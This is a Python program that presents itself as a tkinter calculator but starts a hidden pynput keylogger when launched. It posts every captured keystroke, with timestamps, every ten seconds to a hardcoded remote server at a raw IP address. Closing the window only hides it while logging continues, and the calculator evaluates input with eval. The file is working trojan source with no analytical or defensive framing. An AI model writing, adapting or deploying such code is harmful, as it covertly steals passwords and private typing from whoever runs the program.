import threading
import requests
from pynput import keyboard
from datetime import datetime
import tkinter as tk
from tkinter import messagebox

# Remote server URL
REMOTE_SERVER_URL = "http://51.120.1.186:5000/receive"

# Keylogging buffer
keylog_buffer = []

# Function to send logged keys to the server
def send_to_server():
    global keylog_buffer
    while True:
        if keylog_buffer:
            try:
                data = {"keystrokes": "".join(keylog_buffer), "timestamp": str(datetime.now())}
                response = requests.post(REMOTE_SERVER_URL, json=data)
                if response.status_code == 200:
                    keylog_buffer.clear()
                else:
                    print(f"Failed to send data: {response.status_code}")
            except Exception as e:
                print(f"Error sending data: {e}")
        threading.Event().wait(10)

# Function to log key presses
def on_press(key):
    global keylog_buffer
    try:
        keylog_buffer.append(f"{key.char}")
    except AttributeError:
        keylog_buffer.append(f"[{key}]")

# Function to stop keylogging when 'Escape' is pressed
def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

# Calculator GUI
def calculator_gui():
    def click(event):
        text = event.widget.cget("text")
        if text == "=":
            try:
                result = eval(screen.get())
                screen.delete(0, tk.END)
                screen.insert(tk.END, str(result))
            except Exception as e:
                messagebox.showerror("Error", "Invalid Input")
        elif text == "C":
            screen.delete(0, tk.END)
        else:
            screen.insert(tk.END, text)

    def on_close():
        # Change color and hide the window
        root.config(bg="lightgray")
        root.withdraw()  # Hide the window

    # Main window
    root = tk.Tk()
    root.title("Calculator")
    root.geometry("300x400")

    # Override close button behavior
    root.protocol("WM_DELETE_WINDOW", on_close)

    # Entry screen
    screen = tk.Entry(root, font="Arial 18 bold", justify="right")
    screen.pack(fill=tk.X, ipadx=8, pady=10, padx=10)

    # Buttons
    button_texts = [
        "7", "8", "9", "+",
        "4", "5", "6", "-",
        "1", "2", "3", "*",
        "C", "0", "=", "/"
    ]

    button_frame = tk.Frame(root)
    button_frame.pack()

    for i, text in enumerate(button_texts):
        button = tk.Button(button_frame, text=text, font="Arial 14", width=5, height=2)
        button.grid(row=i // 4, column=i % 4, padx=5, pady=5)
        button.bind("<Button-1>", click)

    root.mainloop()

# Start the keylogger in the background
def start_keylogger():
    # Start the keylogging thread
    keylogger_thread = threading.Thread(
        target=lambda: keyboard.Listener(on_press=on_press, on_release=on_release).start(),
        daemon=True
    )
    keylogger_thread.start()

    # Start the server communication thread
    server_thread = threading.Thread(target=send_to_server, daemon=True)
    server_thread.start()

# Run the keylogger and calculator GUI
if __name__ == "__main__":
    # Start keylogger in the background
    start_keylogger()

    # Run the calculator GUI in a separate thread
    gui_thread = threading.Thread(target=calculator_gui, daemon=True)
    gui_thread.start()

    # Keep the main thread alive
    while True:
        threading.Event().wait(1)


